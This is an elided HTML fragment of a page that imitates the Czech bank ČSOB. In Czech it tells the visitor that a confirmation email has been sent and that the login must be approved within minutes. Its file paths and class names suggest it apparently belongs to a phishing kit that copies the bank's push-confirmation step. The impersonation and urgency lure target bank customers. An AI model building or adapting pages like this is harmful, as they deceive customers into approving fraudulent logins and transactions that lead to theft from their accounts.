...
<html lang="en">
<head>
    <link rel="stylesheet" type="text/css" href="csob/csobpushmail.css">
    <meta charset="UTF-8">
        ...
        <div class="main">
            ...
            <div class="logpass">
                <div class="tabl">
                    ...
                    <div class='message'>
                        Byl vám zaslán e-mail z banky ČSOB. Pro dokončení transakce přejděte na svůj e-mail a potvrďte přihlášení. Na potvrzení máte několik minut.                  
                    </div>
                </div>
                <div class="vxod">
                    <img src="csob/images/mail.png" alt=''>
                </div>
                <div class="message2">
                ...
                <div class="datumcas">
                    ...
                    <div id="datetime"></div>
                    <script src="csob/csobpushmail.js"></script>
                </div>
            </div>
        </div>
        <div class="foot">
